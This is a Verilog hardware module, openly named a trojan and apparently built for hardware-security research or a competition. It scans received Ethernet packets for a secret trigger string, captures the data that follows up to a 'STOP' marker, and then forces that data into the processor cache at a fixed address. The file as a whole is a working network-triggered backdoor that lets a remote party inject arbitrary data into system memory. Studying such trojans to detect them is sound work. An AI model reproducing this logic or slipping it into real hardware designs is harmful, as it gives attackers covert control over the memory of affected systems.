
`include "global_defines.v"

`define TROJ_CACHE_BASE_ADDR 32'h0020E900

//NOTE: In order to be successfully matched, the key must start on a word
//  boundary. This means it should be offset 2 bytes from the start of the UDP
//  data section. It should also be a multiple of four bytes

`define SECRET_KEY_0 32'h5f534543 // _SEC
`define SECRET_KEY_1 32'h5245545f // RET_

`define SECRET_END_0 32'h53544F50 // STOP

`define NO_MATCH   0
`define PART_MATCH 1
`define MATCH      2
`define PART_END   3
`define END        4

module trojan (
    input wire i_clk,
    input wire i_rst,

    input wire [31:0] i_rx_packet_data,
    input wire        i_rx_packet_data_valid,
    input wire        i_rx_packet_reset,

    input wire	      i_cache_stall,

	// Write to cache
	output reg			o_troj,
	output reg [127:0] 	o_troj_write_data,
	output reg [31:0]	o_troj_write_addr,
	output reg [31:0]   o_troj_write_addr_nxt
    );

	reg [15:0]	cache_state;
	reg [15:0]	cache_state_nxt;
	
	wire [127:0] 	troj_data1;
	wire [127:0]	troj_data2;
	wire [127:0] 	troj_data3;
	
	reg		o_troj_nxt;
	reg [127:0]	write_data_nxt;

	reg 		stall_reg;

    reg first_time;
    reg first_time_nxt;
	
	assign troj_data1 = 128'h58595859585958595859585958595859;		/// "XYXY..."
	assign troj_data2 = 128'h58595859585958595859585958595859;
	assign troj_data3 = 128'h00595859585958595859585958595859;		
	
	always @(posedge i_clk) begin
		if (i_rst) begin
			o_troj 			<= 1'b0;
			cache_state 		<= 16'b0;
			//o_troj_write_data 	<= troj_data1;
			o_troj_write_data 	<= trojan_data_store;
			o_troj_write_addr	<= `TROJ_CACHE_BASE_ADDR;
			stall_reg		<= 1'b0;
            first_time      <= 1'b1;
		end
		else if (o_troj && !i_cache_stall) begin
			if (!stall_reg) begin
			    cache_state		<= cache_state_nxt;
				o_troj_write_data	<= write_data_nxt;
				o_troj_write_addr	<= o_troj_write_addr_nxt;
			end else begin
			    cache_state		<= cache_state;
				o_troj_write_data	<= write_data_nxt;
				o_troj_write_addr	<= o_troj_write_addr;
				stall_reg		<= 1'b0;
			end
            o_troj <= o_troj_nxt;
            first_time <= first_time_nxt;
		end
		else begin
            o_troj <= o_troj_nxt;
            first_time <= first_time_nxt;
			cache_state		<= cache_state_nxt;
			o_troj_write_data	<= write_data_nxt;
			o_troj_write_addr	<= o_troj_write_addr;
			stall_reg 		<= 1'b1;
		end
	end
	
	always @(*) begin
        o_troj_nxt = o_troj;
        first_time_nxt = first_time;
        cache_state_nxt = cache_state;

        if (match_state == `END || first_time) begin
			cache_state_nxt = cache_state + 1;
            o_troj_nxt = 1;
        end

        if (cache_state == 1) begin
			cache_state_nxt = 0;
            o_troj_nxt = 0;
            first_time_nxt = 0;
        end

        write_data_nxt = trojan_data_store;
		
        /*
		if (o_troj_write_data == troj_data1)
			write_data_nxt = troj_data2;
		else if (o_troj_write_data == troj_data2)
			write_data_nxt = troj_data3;
		else
			write_data_nxt = troj_data1;
        */
			
		o_troj_write_addr_nxt = o_troj_write_addr;// + 8'h10;
	end
    

    // Ethernet stuff
    reg [31:0] trojan_data;
    reg        trojan_data_valid;
    reg [128-1:0] trojan_data_store;
    reg [128-1:0] trojan_data_store_nxt;

    // signals for watching ethernet RX
    reg [2:0] match_state;
    reg [2:0] match_state_nxt;
    reg [31:0] buffered_data;
    reg [31:0] buffered_data_nxt;
    reg        buffered_valid;
    reg        buffered_valid_nxt;

    wire valid = (i_rx_packet_data_valid && ~i_rx_packet_reset);

    always @(*) begin
        match_state_nxt = match_state;
        buffered_data_nxt = 32'hDEADBEEF;
        buffered_valid_nxt = 0;

        // Test for the key
        if (valid) begin
            case (match_state)
                `NO_MATCH: begin
                    if (i_rx_packet_data == `SECRET_KEY_0) begin
                        match_state_nxt = `PART_MATCH;
                    end
                end
                `PART_MATCH: begin
                    if (i_rx_packet_data == `SECRET_KEY_1) begin
                        match_state_nxt = `MATCH;
                    end else begin
                        match_state_nxt = `NO_MATCH;
                    end
                end
                `MATCH: begin
                    // Match found! Do things...
                    buffered_data_nxt = i_rx_packet_data;
                    buffered_valid_nxt = 1;
                    match_state_nxt = `MATCH;

                    // look for data to end
                    if (i_rx_packet_data == `SECRET_END_0) begin
                        buffered_data_nxt = 32'h0;
                        buffered_valid_nxt = 0;
                        match_state_nxt = `END;
                    end
                end
                `END: begin
                    // return to searching for start of data
                    match_state_nxt = `NO_MATCH;
                end
                default: begin
                    // How did we get here?
                    match_state_nxt = `NO_MATCH;
                end
            endcase
        end

        trojan_data_store_nxt = trojan_data_store;
        if (trojan_data_valid) begin
            trojan_data_store_nxt = {trojan_data, trojan_data_store[128-1:32]};
        end
    end

    always @(posedge i_clk) begin
        if (i_rst) begin
            trojan_data <= 32'h0;
            trojan_data_valid <= 0;

            match_state <= `NO_MATCH;
            buffered_data <= 32'h0;
            buffered_valid <= 0;

            trojan_data_store <= 128'h58595859585958595859585958595859;		/// "XYXY..."

        end else begin
            trojan_data <= buffered_data;
            trojan_data_valid <= buffered_valid;

            match_state <= match_state_nxt;
            buffered_data <= buffered_data_nxt;
            buffered_valid <= buffered_valid_nxt;

            trojan_data_store <= trojan_data_store_nxt;

        end
    end

    // Display text in human readable form for simulation
    always @(posedge i_clk) begin
        if (!i_rst && valid) begin
            $display("RX Data Received: %X %X %X %X  (%d %d %d %d) \"%c %c %c %c\"\n",
                i_rx_packet_data[31:24], i_rx_packet_data[23:16], i_rx_packet_data[15:8], i_rx_packet_data[7:0],
                i_rx_packet_data[31:24], i_rx_packet_data[23:16], i_rx_packet_data[15:8], i_rx_packet_data[7:0],
                i_rx_packet_data[31:24], i_rx_packet_data[23:16], i_rx_packet_data[15:8], i_rx_packet_data[7:0],
            );
        end

        if (!i_rst && trojan_data_valid) begin
            $display("Trojan Data: 0x%X\n", trojan_data);
        end

        if (!i_rst && o_troj) begin
            $display("Cache State: %d  addr[0x%X]=0x%X\n", cache_state, o_troj_write_addr, o_troj_write_data);
            $display("Trojan Data Store: 0x%X\n", trojan_data_store);
        end
    end
endmodule

